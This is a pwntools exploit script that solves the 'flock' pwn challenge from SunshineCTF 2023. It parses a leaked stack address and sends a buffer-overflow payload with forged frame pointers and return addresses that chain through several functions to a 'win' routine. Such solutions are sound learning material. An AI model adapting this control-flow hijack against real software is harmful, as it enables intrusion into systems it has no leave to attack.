from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('flock')
r= e.process()
r = remote('chal.2023.sunshinectf.games', 23002)
lib = e.libc
# lib= ELF('libc6_2.35-0ubuntu3_amd64.so')
win =0x4011B9
ret= 0x401016

r.recvuntil(b"<<< Song Begins At 0x")
buf_addr = int(r.recv(12),16)
log.info("buf_addr: %#x" %(buf_addr))
pause()
rbp=buf_addr
payload = flat(0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,rbp+0xb0,0x401276)
payload+= flat(0x10, 0x11,0x12,0x4012a0) 
payload+= flat(rbp+0xb0+32,0x4012a0,0x22,0x4012ca)
payload+= flat(rbp+0xb0+32+32,0x4012ca,0x32,0x4012f0)
payload+= flat(0x40,0x4012f0,0x42,0x401554,0,ret,win)

r.sendline(payload)

r.interactive()
